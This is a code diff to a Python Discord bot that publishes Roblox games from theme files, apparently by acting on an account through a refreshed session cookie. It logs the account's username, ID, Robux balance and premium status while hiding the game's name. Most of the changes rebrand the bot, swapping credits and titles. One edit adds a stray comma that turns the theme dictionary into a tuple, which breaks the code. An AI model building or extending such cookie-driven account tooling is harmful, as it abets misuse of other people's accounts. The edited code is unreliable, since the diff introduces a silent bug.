@@ -16,12 +16,16 @@ load_dotenv()
 #Make sure to add Undercores in thee file_lcoation to prevent any errors.
 
 rbxlx_files = {
-    "nl": { #Theme Value make sure this not same value if you add a new theme
-        "theme_name": "Normal Theme",
-        "file_location": "Files/Normal_Theme.rbxlx"
+    "n1": { #Theme Value make sure this not same value if you add a new theme
+        "theme_name": "Skyland Theme",
+        "file_location": "Files/skyland.rbxlx"
+    },
+    "n2": { #Theme Value make sure this not same value if you add a new theme
+        "theme_name": "Limited Theme",
+        "file_location": "Files/test.rbxlx"
     },
     # Add more themes here as needed
-}
+},
 
 # Generate choices using a loop
 theme_choices = [
@@ -134,7 +138,7 @@ tree = discord.app_commands.CommandTree(client)
 @client.event
 async def on_ready():
     await tree.sync()
-    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='wtsrtsrtrb'), status=discord.Status.dnd)
+    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='RENCE'), status=discord.Status.dnd)
     print('Logged in')
     print('------')
     print(client.user.display_name)
@@ -434,7 +438,7 @@ async def slash_publish_new_game(interaction: discord.Interaction, theme: discor
     username = data['UserName']
     userid = data['UserID']
     user_robux = data['RobuxBalance']
-    user_isprem = data['IsPremium']
+    user_isprem = data['Premium']
     avatarurl = data['ThumbnailUrl']
 
   except:
@@ -544,13 +548,13 @@ async def slash_publish_new_game(interaction: discord.Interaction, theme: discor
         channel = client.get_channel(int(os.getenv('PUBLISH_LOG')))
 
         embed_var = discord.Embed(
-          title="Newton Rgui",
-          description= f'**<@{interaction.user.id}> Just uploaded a Game**\n\n**Account Information**\n**Account Username -** ' + str(username) + '\n**Account ID - ** ' + str(userid) + '\n**Robux - ** ' + str(user_robux) + '\n**isPremium? - **' + str(user_isprem) + '\n\n**Game Information**\n**Game Name - ||Hidden||**\n**Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
+          title="Void MGUI",
+          description= f'**<@{interaction.user.id}> Just uploaded a Game**\n\n**Account Information**\n**Account Username -** ' + str(username) + '\n**Account ID - ** ' + str(userid) + '\n**Robux - ** ' + str(user_robux) + '\n**Premium? - **' + str(user_isprem) + '\n\n**Game Information**\n**Game Name - ||Hidden||**\n**Game Description - ||Hidden||**\n**Theme -** '+ str(theme.name)+'',
           color=0xfac54d
         )
         embed_var.set_thumbnail(url=f'{avatarurl}')
 
-        embed_var.set_footer(text='Made by feathers')
+        embed_var.set_footer(text='Made by RenceOnTop')
         await channel.send(embed=embed_var)
   else:
         message2 = (f'Oops! Something went wrong, {refreshed_cookie}!')
